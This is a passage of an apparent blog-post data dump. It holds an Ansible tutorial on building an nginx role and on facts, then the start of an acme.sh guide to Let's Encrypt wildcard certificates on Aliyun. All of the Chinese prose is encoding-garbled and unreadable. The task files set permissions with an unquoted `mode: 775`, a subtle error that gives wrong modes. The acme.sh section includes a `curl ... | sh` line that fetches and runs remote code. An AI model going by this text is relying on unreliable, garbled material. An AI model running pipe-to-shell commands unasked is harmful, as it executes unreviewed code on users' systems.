‡å‚æ•°ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œpathé…ç½®ä½¿ç”¨æ‹¬å·{{ var-name }}ï¼Œè¿™æ˜¯Jinja2çš„æ¨¡æ¿ã€‚ä¸ºäº†ä½¿ansibleèƒ½å¤Ÿåœ¨æ‹¬å·å†…è§£æJinja2æ¨¡æ¿å˜é‡ï¼Œè¯¥è¡Œå¿…é¡»æ˜¯å•å¼•å·æˆ–åŒå¼•å· - ä¾‹å¦‚ï¼Œpath: '{{ docroot }}' è€Œä¸æ˜¯path: {{ docroot }}ã€‚ä¸ä½¿ç”¨å¼•å·å°†å¯¼è‡´é”™è¯¯ã€‚ è¿™ä¸ªplaybookå¯ä»¥ç”¨é€šå¸¸çš„å‘½ä»¤è¿è¡Œï¼š\n\n```\nansible-playbook -i ./hosts nginx.yml\n```\n\n\n\n### 4. ansibleè§’è‰²ï¼ˆrolesï¼‰\n\nè§’è‰²æ‰æ˜¯ansibleçš„ç²¾é«“, æ¯ä¸ªäººå¯ä»¥åšå‡ºè‡ªå·±çš„è§’è‰²è®©åˆ«äººä½¿ç”¨, ä¹Ÿå¯ä»¥é€šè¿‡ansible-galaxyå®‰è£…å…¶ä»–äººçš„è§’è‰²ã€‚\n\nè§’è‰²å¾ˆé€‚åˆç»„ç»‡å¤šä¸ªç›¸å…³ä»»åŠ¡å¹¶å°è£…å®Œæˆè¿™äº›ä»»åŠ¡æ‰€éœ€çš„æ•°æ®ã€‚ä¾‹å¦‚ï¼Œå®‰è£…nginxå¯èƒ½æ¶‰åŠæ·»åŠ è½¯ä»¶åŒ…å­˜å‚¨åº“ï¼Œå®‰è£…è½¯ä»¶åŒ…å’Œè®¾ç½®é…ç½®ã€‚ \n\næ­¤å¤–ï¼ŒçœŸå®çš„é…ç½®é€šå¸¸éœ€è¦é¢å¤–çš„æ•°æ®ï¼Œå¦‚å˜é‡ï¼Œæ–‡ä»¶ï¼ŒåŠ¨æ€æ¨¡æ¿ç­‰ç­‰ã€‚è¿™äº›å·¥å…·å¯ä»¥ä¸Playbookä¸€èµ·ä½¿ç”¨ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡å°†ç›¸å…³ä»»åŠ¡å’Œæ•°æ®ç»„ç»‡æˆä¸€ä¸ªè§’è‰²ï¼ˆroleï¼Œ ç›¸å…³çš„ç»“æ„ï¼‰å¾ˆå¿«å°±èƒ½åšå¾—æ›´å¥½ã€‚ \n\nè§’è‰²æœ‰ä¸€ä¸ªè¿™æ ·çš„ç›®å½•ç»“æ„ï¼š\n\n```\nroles\n  rolename\n   - files\n   - handlers\n   - meta\n   - templates\n   - tasks\n   - vars\n```\n\nåœ¨æ¯ä¸ªå­ç›®å½•ä¸­ï¼ˆegï¼š filesï¼Œhandlersç­‰ç­‰ï¼‰ï¼Œansibleå°†è‡ªåŠ¨æœç´¢å¹¶è¯»å–å«åšmain.ymlçš„yamlæ–‡ä»¶ã€‚ \n\næ¥ä¸‹æ¥æˆ‘ä»¬å°†åˆ†è§£nginx.ymlæ–‡ä»¶å†…å®¹ä¸ºä¸åŒçš„ç»„ä»¶ï¼Œå¹¶å°†æ¯ä¸ªç»„ä»¶æ”¾åœ¨ç›¸åº”çš„ç›®å½•ä¸­ï¼Œä»¥åˆ›å»ºä¸€ä¸ªæ›´å¹²å‡€ï¼Œæ›´å®Œæ•´çš„é…ç½®å·¥å…·é›†ã€‚\n\n\n\n##### 4.1 åˆ›å»ºè§’è‰²ï¼ˆcreating a roleï¼‰\n\næˆ‘ä»¬å¯ä»¥ä½¿ç”¨ansible-galaxyå‘½ä»¤æ¥åˆ›å»ºä¸€ä¸ªæ–°è§’è‰²ã€‚æ­¤å·¥å…·å¯ç”¨äºå°†è§’è‰²ä¿å­˜åˆ°ansibleçš„å…¬å…±æ³¨å†Œè¡¨ï¼Œä½†æ˜¯æˆ‘é€šå¸¸åªæ˜¯ä½¿ç”¨å®ƒæ¥åœ¨æœ¬åœ°åˆ›å»ºroleçš„åŸºç¡€ç›®å½•ç»“æ„ã€‚\n\n```bash\ncd ~/ansible-example\nmkdir roles\ncd roles\nansible-galaxy init nginx\n```\n\nç›®å½•åç§°rolesæ˜¯ä¸€ç§æƒ¯ä¾‹ï¼Œåœ¨è¿è¡Œä¸€ä¸ªplaybookæ—¶å¯ä»¥ç”¨æ¥æŸ¥æ‰¾è§’è‰²ã€‚è¯¥ç›®å½•åº”è¯¥å§‹ç»ˆè¢«å‘½årolesï¼Œä½†å¹¶ä¸å¼ºåˆ¶ã€‚åœ¨rolesç›®å½•ä¸­è¿è¡Œ ansible-galaxy init nginx å‘½ä»¤å°†åˆ›å»ºæ–°è§’è‰²æ‰€éœ€çš„ç›®å½•å’Œæ–‡ä»¶ã€‚\n\næˆ‘ä»¬æ¥çœ‹çœ‹æˆ‘ä»¬æ–°å»ºçš„nginxè§’è‰²çš„æ¯ä¸ªéƒ¨åˆ†~/ansible-example/roles/nginxã€‚\n\n##### 4.2.1 æ–‡ä»¶ï¼ˆfilesï¼‰\n\nfilesç›®å½•ä¸­æ²¡æœ‰main.ymlæ–‡ä»¶.  é¦–å…ˆï¼Œåœ¨filesç›®å½•ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æ·»åŠ æˆ‘ä»¬è¦å¤åˆ¶åˆ°æˆ‘ä»¬çš„æœåŠ¡å™¨ä¸­çš„æ–‡ä»¶ã€‚å¯¹äºnginxï¼Œæˆ‘ç»å¸¸å¤åˆ¶h5bpçš„nginxç»„ä»¶é…ç½®ã€‚æˆ‘åªéœ€ä»githubä¸‹è½½æœ€æ–°çš„ä¿¡æ¯ï¼Œè¿›è¡Œä¸€äº›è°ƒæ•´ï¼Œå¹¶å°†å®ƒä»¬æ”¾å…¥filesç›®å½•ä¸­ã€‚\n\n```\n~/ansible-example\n - roles\n - - nginx\n - - - files\n - - - - h5bp\n```\n\næˆ‘ä»¬ç¨åä¼šçœ‹åˆ°ï¼Œh5bpé…ç½®æ–‡ä»¶å°†é€šè¿‡å¤åˆ¶æ¨¡å—æ·»åŠ åˆ°æœåŠ¡å™¨ã€‚\n\n\n\n##### 4.2.2 å¤„ç†ç¨‹åºï¼ˆhandlersï¼‰\n\nhandlersçº¦å®šå¿…é¡»åŒ…å«main.ymlæ–‡ä»¶ã€‚æˆ‘ä»¬å¯ä»¥æŠŠæ›¾ç»åœ¨nginx.yml å‰§æœ¬ä¸­çš„å®šä¹‰çš„æ‰€æœ‰å¤„ç†ç¨‹åºæ”¾å…¥åˆ°handlersç›®å½•ä¸­ã€‚\n\nhandlers/main.yml å†…å®¹ï¼š\n\n```yml\n---\n# handlers file for nginx\n\n- name: Start Nginx\n  service:\n    name: nginx\n    state: started\n\n- name: Reload Nginx\n  service:\n    name: nginx\n    state: reloaded\n```\n\nä¸€æ—¦handlers/main.ymlä¸­çš„å¤„ç†ç¨‹åºå®šä¹‰å¥½äº†ï¼Œæˆ‘ä»¬å¯ä»¥è‡ªç”±åœ°ä»å…¶ä»–çš„yamlé…ç½®ä¸­å¼•ç”¨å®ƒä»¬ã€‚\n\n\n\n##### 4.2.3 å…ƒï¼ˆmetaï¼‰\n\nmetaç›®å½•ä¸­çº¦å®šå¿…é¡»åŒ…å«main.ymlæ–‡ä»¶ã€‚main.ymlæ–‡ä»¶åŒ…å«roleå…ƒæ•°æ®ï¼ŒåŒ…å«çš„ä¾èµ–å…³ç³»ã€‚å¦‚æœè¿™ä¸ªè§’è‰²ä¾èµ–äºå¦ä¸€ä¸ªè§’è‰²ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è¿™é‡Œå®šä¹‰ã€‚ä¾‹å¦‚ï¼Œnginxè§’è‰²å–å†³äºå®‰è£…sslè¯ä¹¦çš„sslè§’è‰²ã€‚ \n\nmeta/main.yml å†…å®¹ï¼š\n\n```yml\n---\ndependencies:\n  - { role: ssl }\n```\n\nå¦‚æœæˆ‘è°ƒç”¨äº†â€œnginxâ€è§’è‰²ï¼Œå®ƒå°†å°è¯•é¦–å…ˆè¿è¡Œâ€œsslâ€è§’è‰²ã€‚ å¦åˆ™æˆ‘ä»¬å¯ä»¥çœç•¥æ­¤æ–‡ä»¶ï¼Œæˆ–å°†è§’è‰²å®šä¹‰ä¸ºæ²¡æœ‰ä¾èµ–å…³ç³»ï¼š\n\n```yml\n---\ndependencies: []\n```\n\n\n\n##### 4.2.4 æ¨¡æ¿ï¼ˆtemplatesï¼‰\n\ntemplatesç›®å½•ä¸­æ²¡æœ‰main.ymlæ–‡ä»¶ï¼ŒåªåŒ…å«.j2åç¼€çš„æ¨¡æ¿æ–‡ä»¶ã€‚ åŸºäºpythonçš„Jinja2æ¨¡æ¿å¼•æ“ï¼ˆå’Œdjangoçš„æ¨¡æ¿å¼•æ“å¾ˆç±»ä¼¼ï¼‰ï¼Œæ¨¡æ¿æ–‡ä»¶å¯ä»¥åŒ…å«æ¨¡æ¿å˜é‡ã€‚è¿™é‡Œçš„æ–‡ä»¶åº”è¯¥ä»¥.j2ä¸ºç±»å‹åç¼€ï¼ˆeg.uwsgi.j2ï¼‰ï¼Œæå€¡ä½†æ˜¯ä¸å¼ºåˆ¶ï¼Œä¹Ÿå¯ä»¥å–å…¶ä»–çš„åå­—ã€‚\n\nè¿™æ˜¯ä¸€ä¸ªnginxæœåŠ¡å™¨ï¼ˆâ€œè™šæ‹Ÿä¸»æœºâ€ï¼‰é…ç½®çš„ä¾‹å­ã€‚è¯·æ³¨æ„ï¼Œå®ƒä½¿ç”¨äº†ç¨ååœ¨vars/main.ymlæ–‡ä»¶ä¸­å®šä¹‰çš„ä¸€äº›å˜é‡ã€‚ æˆ‘ä»¬çš„ç¤ºä¾‹ä¸­çš„nginxé…ç½®æ–‡ä»¶ä½äºtemplates/serversforhackers.com.conf.j2ï¼š\n\n```nginx\nserver {\n    # Enforce the use of HTTPS\n    listen 80 default_server;\n    server_name {{ domain }};\n    return 301 https://$server_name$request_uri;\n}\n\nserver {\n    listen 443 ssl default_server;\n\n    root /var/www/{{ domain }}/public;\n    index index.html index.htm index.php;\n\n    access_log /var/log/nginx/{{ domain }}.log;\n    error_log  /var/log/nginx/{{ domain }}-error.log error;\n\n    server_name {{ domain }};\n\n    charset utf-8;\n\n    include h5bp/basic.conf;\n\n    ssl_certificate           {{ ssl_crt }};\n    ssl_certificate_key       {{ ssl_key }};\n    include h5bp/directive-only/ssl.conf;\n\n    location / {\n        try_files $uri $uri/ /index.php$is_args$args;\n    }\n\n    location = /favicon.ico { log_not_found off; access_log off; }\n    location = /robots.txt  { log_not_found off; access_log off; }\n\n    location ~ \\.php$ {\n        include snippets/fastcgi.conf;\n        fastcgi_pass unix:/var/run/php7.1-fpm.sock;\n    }\n}\n```\n\nè¿™æ˜¯ä¸€ä¸ªç›¸å½“æ ‡å‡†çš„ç”¨äºphpåº”ç”¨ç¨‹åºçš„Nginxé…ç½®ã€‚è¿™é‡Œæœ‰ä¸‰ä¸ªå˜é‡ï¼š`domain` `ssl_crt` `ssl_key` è¿™ä¸‰ä¸ªå˜é‡å°†åœ¨å˜é‡éƒ¨åˆ†ï¼ˆvarsï¼‰ä¸­å®šä¹‰ã€‚\n\n##### 4.2.5 å˜é‡ï¼ˆvarsï¼‰\n\nvarsç›®å½•åŒ…å«ä¸€ä¸ªmain.ymlæ–‡ä»¶, åœ¨main.ymlä¸­æˆ‘ä»¬å¯ä»¥åˆ—å‡ºå°†è¦ä½¿ç”¨çš„æ‰€æœ‰å˜é‡ã€‚ \n\nvars/main.ymlï¼š\n\n```yml\n---\ndomain: serversforhackers.com\nssl_key: /etc/ssl/sfh/sfh.key\nssl_crt: /etc/ssl/sfh/sfh.crt\n```\n\n+ Note:å¦‚æœæ‚¨æœ‰æ•æ„Ÿä¿¡æ¯æ·»åŠ åˆ°å˜é‡æ–‡ä»¶ä¸­ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ansible-vaultåŠ å¯†æ–‡ä»¶ã€‚\n\n\n\n##### 4.2.6 ä»»åŠ¡ï¼ˆtasksï¼‰\n\ntasksç›®å½•åŒ…å«ä¸€ä¸ªmain.ymlæ–‡ä»¶, ä½¿ç”¨è§’è‰²æ—¶è¿è¡Œçš„ä¸»æ–‡ä»¶æ˜¯tasks/main.ymlæ–‡ä»¶ã€‚çœ‹çœ‹æˆ‘ä»¬çš„ç”¨ä¾‹å°†ä¼šæ˜¯ä»€ä¹ˆæ ·çš„ï¼š\n\n```yml\n---\n- name: Add Nginx Repository\n  apt_repository:\n    repo: ppa:nginx/stable\n    state: present\n\n- name: Install Nginx\n  apt:\n    pkg: nginx\n    state: installed\n    update_cache: true\n  notify:\n    - Start Nginx # åœ¨handleræ–‡ä»¶å¤¹é‡Œ\n\n- name: Add H5BP Config\n  copy:\n    src: h5bp\n    dest: /etc/nginx\n    owner: root\n    group: root\n\n- name: Disable Default Site Configuration\n  file:\n    dest: /etc/nginx/sites-enabled/default\n    state: absent\n\n# `dest` in quotes as a variable is used!\n- name: Add SFH Site Config\n  register: sfhconfig\n  template:\n    src: serversforhackers.com.j2\n    dest: '/etc/nginx/sites-available/{{ domain }}.conf' \n    owner: root\n    group: root\n\n# `src`/`dest` in quotes as a variable is used!\n- name: Enable SFH Site Config\n  file:\n    src: '/etc/nginx/sites-available/{{ domain }}.conf'\n    dest: '/etc/nginx/sites-enabled/{{ domain }}.conf'\n    state: link\n\n# `dest` in quotes as a variable is used!\n- name: Create Web root\n  file:\n    dest: '/var/www/{{ domain }}/public'\n    mode: 775\n    state: directory\n    owner: www-data\n    group: www-data\n  notify:\n    - Reload Nginx\n\n# `dest` in quotes as a variable is used!\n- name: Web Root Permissions\n  file:\n   dest: '/var/www/{{ domain }}'\n   mode: 775\n   state: directory\n   owner: www-data\n   group: www-data\n   recurse: yes\n  notify:\n    - Reload Nginx\n```\n\nè¿™ä¸€ç³»åˆ—ä»»åŠ¡ä½¿å¾—nginxèƒ½è¢«å®Œæ•´çš„å®‰è£…ã€‚ä»»åŠ¡æŒ‰ç…§å‡ºç°çš„é¡ºåºå®Œæˆä»¥ä¸‹å·¥ä½œï¼š\n\n```\n1 æ·»åŠ nginx / stableåº“\n2 å®‰è£…å¹¶å¯åŠ¨nginx\n3 æ·»åŠ H5BPé…ç½®æ–‡ä»¶\n4 ä»sites-enabledç›®å½•ä¸­åˆ é™¤æ–‡ä»¶çš„ç¬¦å·é“¾æ¥æ¥ç¦ç”¨é»˜è®¤çš„nginxé…ç½®\n5 å°†serversforhackers.com.conf.j2è™šæ‹Ÿä¸»æœºæ¨¡æ¿å¤åˆ¶åˆ°nginxé…ç½®ä¸­ï¼Œæ¸²æŸ“æ¨¡æ¿\n6 é€šè¿‡å°†å…¶ç¬¦å·é“¾æ¥åˆ°sites-enabledç›®å½•æ¥å¯ç”¨NginxæœåŠ¡å™¨é…ç½®\n7 åˆ›å»ºWebæ ¹ç›®å½•\n8 æ›´æ”¹é¡¹ç›®æ ¹ç›®å½•çš„æƒé™ï¼ˆé€’å½’ï¼‰ï¼Œè¯¥ç›®å½•ä½äºä¹‹å‰åˆ›å»ºçš„Webæ ¹ç›®å½•ä¹‹ä¸Š\n```\n\næœ‰ä¸€äº›æ–°çš„æ¨¡å—ï¼ˆå’Œä¸€äº›æˆ‘ä»¬å·²ç»æ¶µç›–çš„æ–°ç”¨é€”ï¼‰ï¼ŒåŒ…æ‹¬å¤åˆ¶ï¼Œæ¨¡æ¿å’Œæ–‡ä»¶æ¨¡å—ã€‚é€šè¿‡è®¾ç½®æ¯ä¸ªæ¨¡å—çš„å‚æ•°ï¼Œæˆ‘ä»¬å¯ä»¥åšä¸€äº›æœ‰è¶£çš„äº‹æƒ…ï¼Œä¾‹å¦‚ç¡®ä¿æ–‡ä»¶â€œä¸å­˜åœ¨â€ï¼ˆå¦‚æœå­˜åœ¨åˆ™åˆ é™¤å®ƒä»¬ï¼‰çš„state: absentï¼Œæˆ–è€…é€šè¿‡åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ä½œä¸ºç¬¦å·é“¾æ¥çš„state: linkã€‚æ‚¨åº”è¯¥æ£€æŸ¥æ¯ä¸ªæ¨¡å—çš„æ–‡æ¡£ï¼Œä»¥æŸ¥çœ‹å¯ä»¥ç”¨å®ƒä»¬å®Œæˆå“ªäº›æœ‰è¶£å’Œæœ‰ç”¨çš„äº‹æƒ…ã€‚\n\nå‚åŠ å®˜æ–¹æ–‡æ¡£: https://docs.ansible.com/ansible/latest/modules/\n\n\n\n##### 4.3 è¿è¡Œè§’è‰²ï¼ˆrunning the Roleï¼‰\n\nè¦å¯¹æœåŠ¡å™¨è¿è¡Œä¸€ä¸ªæˆ–å¤šä¸ªè§’è‰²ï¼Œæˆ‘ä»¬å°†é‡æ–°ä½¿ç”¨å¦ä¸€ä¸ªplaybookã€‚è¯¥playbookä¸rolesç›®å½•ä½äºåŒä¸€ä¸ªç›®å½•ä¸­ï¼ŒåŒä¸€å±‚çº§ã€‚å½“æˆ‘ä»¬ç”¨ansible-playbookå‘½ä»¤è¿è¡Œçš„æ—¶å€™éœ€è¦å…ˆcdè¿›å…¥åˆ°è¯¥ç›®å½•ä¸­ã€‚ \n\nè®©æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªâ€œä¸»â€çš„yamlæ–‡ä»¶ï¼ˆè¢«ansible-playbookå‘½ä»¤æ‰§è¡Œçš„æ–‡ä»¶ï¼‰ï¼Œè¯¥æ–‡ä»¶å®šä¹‰è¦ä½¿ç”¨çš„è§’è‰²ä»¥åŠè¿è¡Œå®ƒä»¬çš„ä¸»æœºï¼š æ–‡ä»¶~/ansible-example/server.ymlä½äºä¸rolesç›®å½•ç›¸åŒçš„ç›®å½•ä¸­ï¼š(æ³¨æ„æ˜¯å’Œrolesç›®å½•åŒå±‚çº§!!!!!)\n\n```yml\n---\n- hosts: local\n  connection: local\n  roles:\n    - nginx # è¿™ä¸ªæ˜¯ä½ åˆšæ‰å†™çš„nginx role\n```\n\næ‰€ä»¥ï¼Œæˆ‘ä»¬åªæ˜¯å®šä¹‰è§’è‰²ï¼Œè€Œä¸æ˜¯åœ¨æœ¬playbookæ–‡ä»¶ä¸­å®šä¹‰æ‰€æœ‰çš„å˜é‡å’Œä»»åŠ¡ã€‚è§’è‰²è´Ÿè´£å…·ä½“ç»†èŠ‚ã€‚ç„¶åæˆ‘ä»¬å¯ä»¥è¿è¡Œè§’è‰²ï¼š\n\n```bash\nansible-playbook -i ./hosts server.yml\n```\n\nä»¥ä¸‹æ˜¯è¿è¡Œnginxè§’è‰²çš„playbookæ–‡ä»¶çš„è¾“å‡ºï¼š\n\n```bash\nPLAY [all] ********************************************************************\n\nGATHERING FACTS ***************************************************************\nok: [127.0.0.1]\n\nTASK: [nginx | Add Nginx Repository] ******************************************\nchanged: [127.0.0.1]\n\nTASK: [nginx | Install Nginx] *************************************************\nchanged: [127.0.0.1]\n\nTASK: [nginx | Add H5BP Config] ***********************************************\nchanged: [127.0.0.1]\n\nTASK: [nginx | Disable Default Site] ******************************************\nchanged: [127.0.0.1]\n\nTASK: [nginx | Add SFH Site Config] *******************************************\nchanged: [127.0.0.1]\n\nTASK: [nginx | Enable SFH Site Config] ****************************************\nchanged: [127.0.0.1]\n\nTASK: [nginx | Create Web root] ***********************************************\nchanged: [127.0.0.1]\n\nTASK: [nginx | Web Root Permissions] ******************************************\nok: [127.0.0.1]\n\nNOTIFIED: [nginx | Start Nginx] ***********************************************\nok: [127.0.0.1]\n\nNOTIFIED: [nginx | Reload Nginx] **********************************************\nchanged: [127.0.0.1]\n\nPLAY RECAP ********************************************************************\n127.0.0.1                  : ok=8   changed=7   unreachable=0    failed=0\n```\n\næˆ‘ä»¬å°†æ‰€æœ‰å„ç§ç»„ä»¶æ”¾åœ¨ä¸€èµ·ï¼Œå½¢æˆä¸€è‡´çš„è§’è‰²ï¼Œç°åœ¨å·²ç»å®‰è£…å¹¶é…ç½®äº†nginxï¼\n\n\n\n### 5. ansibleäº‹å®(facts)\n\nè¯·æ³¨æ„ï¼Œè¿è¡Œå‰§æœ¬æ—¶çš„ç¬¬ä¸€è¡Œæ€»æ˜¯â€œæ”¶é›†äº‹å®â€ã€‚ åœ¨è¿è¡Œä»»ä½•ä»»åŠ¡ä¹‹å‰ï¼Œansibleå°†æ”¶é›†æœ‰å…³å…¶é…ç½®çš„ç³»ç»Ÿçš„ä¿¡æ¯ã€‚è¿™äº›è¢«ç§°ä¸ºäº‹å®ï¼Œå¹¶ä¸”åŒ…æ‹¬å¹¿æ³›çš„ç³»ç»Ÿä¿¡æ¯ï¼Œå¦‚CPUæ ¸å¿ƒæ•°é‡ï¼Œå¯ç”¨çš„ipv4å’Œipv6ç½‘ç»œï¼ŒæŒ‚è½½çš„ç£ç›˜ï¼ŒLinuxå‘è¡Œç‰ˆç­‰ç­‰ã€‚\n\näº‹å®åœ¨â€œä»»åŠ¡â€æˆ–â€œæ¨¡æ¿â€é…ç½®ä¸­é€šå¸¸å¾ˆæœ‰ç”¨ã€‚ä¾‹å¦‚ï¼Œnginxé€šå¸¸è®¾ç½®ä¸ºä½¿ç”¨ä¸cpuå†…æ ¸ä¸€æ ·å¤šçš„å·¥ä½œå¤„ç†å™¨ã€‚çŸ¥é“è¿™ä¸€ç‚¹ï¼Œæ‚¨å¯ä»¥é€‰æ‹©å¦‚ä¸‹è®¾ç½®nginx.conf.j2æ–‡ä»¶çš„æ¨¡æ¿ï¼š\n\n```nginx\nuser www-data;\nworker_processes {{ ansible_processor_cores }};\npid /var/run/nginx.pid;\n\n# And other configurations...\n```\n\næˆ–è€…å¦‚æœä½ å…·æœ‰å¤šä¸ªcpuçš„æœåŠ¡å™¨ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ï¼š\n\n```nginx\nuser www-data;\nworker_processes {{ ansible_processor_cores * ansible_processor_count }};\npid /var/run/nginx.pid;\n\n# And other configurations...\n```\n\næ‰€æœ‰çš„ansible factså…¨å±€å˜é‡éƒ½æ˜¯ä»¥â€œanisble_â€ä¸ºå‰ç¼€ï¼Œå¹¶ä¸”å¯ä»¥åœ¨å…¶ä»–ä»»ä½•åœ°æ–¹ä½¿ç”¨ã€‚ å°è¯•å¯¹ä½ çš„æœ¬åœ°æœºå™¨è¿è¡Œä»¥ä¸‹å†…å®¹ä»¥æŸ¥çœ‹å¯ç”¨çš„äº‹å®ï¼š\n\n```bash\n# Run against a local server\n# Note that we say to use \"localhost\" instead of defining a hosts file here!\nansible -m setup --connection=local localhost\n\n# Run against a remote server\nansible -i ./hosts remote -m setup\n```\n\n\n\n### 6. ansibleé‡åˆ°çš„é—®é¢˜æ€»ç»“\n\n+ é‡åˆ°è§’è‰²æ²¡æœ‰çš„é—®é¢˜, ERROR! the role 'Stouts.ntp' was not found\n\n  é€šè¿‡ansible-galaxyå®‰è£… \n\n  ```\n  ansible-galaxy install stouts.ntp\n  ```\n\n+ ansibleçš„å…¨å±€é…ç½®ansible.cfg\n\n  å¦‚é»˜è®¤æ˜¯å¦éœ€è¦è¾“å…¥å¯†ç ã€æ˜¯å¦å¼€å¯sudoè®¤è¯ã€action_pluginsæ’ä»¶çš„ä½ç½®ã€hostsä¸»æœºç»„çš„ä½ç½®ã€æ˜¯å¦å¼€å¯logåŠŸèƒ½ã€é»˜è®¤ç«¯å£ã€keyæ–‡ä»¶ä½ç½®ç­‰ç­‰ã€‚\n  \n  å‚è§: https://www.cnblogs.com/paul8339/p/6159220.htm\n\n+ hostæ–‡ä»¶æŠŠä¸€ä¸ªç»„ä½œä¸ºå¦ä¸€ä¸ªç»„çš„å­æˆå‘˜ \n\n  ```\n  [atlanta]\n  host1\n  host2\n  \n  [raleigh]\n  host2\n  host3\n  \n  [southeast:children]\n  atlanta\n  raleigh\n  \n  [southeast:vars]\n  some_server=foo.southeast.example.com\n  halon_system_timeout=30\n  self_destruct_countdown=60\n  escape_pods=2\n  \n  [usa:children]\n  southeast\n  northeast\n  southwest\n  northwest\n  ```\n\n  atlanta raleighå°†ä½œä¸ºsoutheastå­ç»„ï¼Œç»§æ‰¿çˆ¶ç»„southeastä¸­some_serverç­‰å˜é‡\n\n  \n\n+ é™åˆ¶è„šæœ¬åªåœ¨æŒ‡å®šçš„ipå¯¹åº”çš„æœºå™¨ä¸Šæ‰§è¡Œã€‚\n\n   -l <SUBSET>, --limit <SUBSET>\n   \n\t```bash\n   ansible-playbook myplaybook.yml -l 10.11.12.13\n   ```\n\n\n\n+ æ‰“æ ‡ç­¾å½’ç±», æŒ‡å®šå½’ç±»ç›¸å…³çš„task\n\n  ```yml\n  ---\n  - include: restart.yml\n    tags:\n      - tag2\n  - include: push.yml\n    tags:\n      - tag1\n  ```\n\n  tagsä¸»è¦ç›®çš„æ˜¯å•ç‹¬æ‰§è¡ŒæŒ‡å®šçš„tagï¼Œä½¿ç”¨-t æˆ–è€…--tags è¡¨ç¤ºã€‚æ—§ç‰ˆæœ¬ä¸æ˜¯è¿™æ ·å†™çš„ï¼Œä¼šç›´æ¥åœ¨includeåé¢åŠ ä¸Štags=xxx,ä½†æ˜¯åœ¨æ–°ç‰ˆæœ¬çš„ansibleæ‰§è¡Œæ—¶è™½ç„¶ä¸æŠ¥é”™ï¼Œä½†æ˜¯ä¹Ÿä¸æ‰§è¡Œè¯¥tagã€‚\n\n\n\n### 7. å‚è€ƒèµ„æ–™\n\n+ [éå¸¸å¥½çš„Ansibleå…¥é—¨æ•™ç¨‹ï¼ˆè¶…ç®€å•ï¼‰](https://blog.csdn.net/pushiqiang/article/details/78126063)\n\n+ [Ansible å¿«é€Ÿå…¥é—¨](https://www.cnblogs.com/dachenzi/p/8916521.html)\n\n+ [ansibleè‡ªåŠ¨åŒ–è¿ç»´æ•™ç¨‹](https://www.w3cschool.cn/automate_with_ansible/ )\n\n+ https://docs.ansible.com/ansible/latest/modules/ å®˜æ–¹æ–‡æ¡£ \n\n  \n\n","tags":["ansible"],"categories":["ç³»ç»Ÿ"]},{"title":"acme.shè‡ªåŠ¨æ›´æ–°é˜¿é‡Œäº‘aliyunè·å–Let's Encrypt wildcardé€šé…ç¬¦SSLè¯ä¹¦","url":"%2Fp%2Fee822cec.html","content":"\n\n\n### 1. è¯ä¹¦ç±»å‹\n\n+ ç›®å‰ä¸»æµçš„SSLè¯ä¹¦ä¸»è¦åˆ†ä¸ºDV SSL(åŸŸåå‹) ã€ OV SSL(ç»„ç»‡å‹) ã€EV SSL(å¢å¼ºå‹)ã€‚\n\n![1](acme.sh/1.png)\n\n<!-- more -->\n\n+ DVã€OVã€EVè¯ä¹¦åœ¨æµè§ˆå™¨ä¸­æ˜¾ç¤ºçš„åŒºåˆ«\n\nDVç±»å‹ä»…åœ¨æµè§ˆå™¨æ˜¾ç¤ºä¸€ä¸ªå°é”ï¼ŒOVå’ŒEVç±»å‹è¯ä¹¦éƒ½åŒ…å«äº†ä¼ä¸šåç§°ä¿¡æ¯ï¼Œä½†æ˜¯ï¼ŒEVè¯ä¹¦é‡‡ç”¨äº†æ›´åŠ ä¸¥æ ¼çš„è®¤è¯æ ‡å‡†ï¼Œæµè§ˆå™¨åœ¨è®¿é—®æ—¶ï¼Œä¼šåœ¨åœ°å€æ æ˜¾ç¤ºå…¬å¸åç§°ï¼Œåœ°å€æ å˜æˆç»¿è‰²ã€‚ç»¿çš„æ›´åŠ è®©äººä¿¡ä»»ã€‚\n\n![1](acme.sh/2.png)\n\n\n\n### 2. ACMEåè®®\n\nACMEå…¨ç§°The Automatic Certificate Management Environmentï¼Œè€Œ[acme.sh](https://link.jianshu.com/?t=https%3A%2F%2Fgithub.com%2FNeilpang%2Facme.sh)è¿™ä¸ªåº“ï¼Œåˆ™èƒ½å¤Ÿåœ¨Linuxä¸Šå®ç°å¦‚ä¸‹åŠŸèƒ½ï¼š\n\n1. è‡ªåŠ¨å‘Let's Encryptç”³è¯·è¯ä¹¦ï¼›\n2. è‡ªåŠ¨è°ƒç”¨å„å¤§äº‘å¹³å°çš„apiæ¥å£å®ç°TXTè§£æé…ç½®ï¼›\n3. è¯ä¹¦ä¸‹å‘åè‡ªåŠ¨éƒ¨ç½²åˆ°nginxï¼›\n4. åˆ©ç”¨å®šæ—¶å™¨ï¼Œæ¯60å¤©è‡ªåŠ¨æ›´æ–°è¯ä¹¦ï¼Œå¹¶å®Œæˆè‡ªåŠ¨éƒ¨ç½²ã€‚\n\n\n\n### 3. é…ç½®è¯ä¹¦\n\n##### 3.1 å®‰è£…acme.sh\n\n```bash\ncurl https://get.acme.sh | sh\n```\n\nè¿™ä¸ªè‡ªåŠ¨å®‰è£…è¿‡ç¨‹å®Œæˆäº†ä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š\n\n1. æ‹·è´shè„šæœ¬åˆ°~/.acme.sh/\n2. åˆ›å»ºaliasåˆ«åacme.sh=~/.acme.sh/acme.sh   (`source ~/.bashrc`ä¸€ä¸‹)\n3. å¯åŠ¨å®šæ—¶å™¨ . å¯ä»¥é€šè¿‡`crontab -l`æŸ¥çœ‹\n\n\n\n##### 3.2 dnséªŒè¯å¹¶å®‰è£…éƒ¨ç½²\n\nacme.sh å®ç°äº† acme åè®®æ”¯æŒçš„æ‰€æœ‰éªŒè¯åè®®. ä¸€èˆ¬æœ‰ä¸¤ç§æ–¹å¼éªŒè¯: http å’Œ dns éªŒè¯. æ¥ä¸‹æ¥æˆ‘ä»¬è¯´ä¸‹ dnsçš„éªŒè¯.\n\n+ å»é˜¿é‡Œçš„æ§åˆ¶å°æ‰¾åˆ°Ali_Key, Ali_Secret, æ‰§è¡Œä¸‹é¢å‘½å\n\n  ```bash\n  export Ali_Key=\"xxxxxxxx\" \n  export Ali_Secret=\"xxxxxxxx\"\n  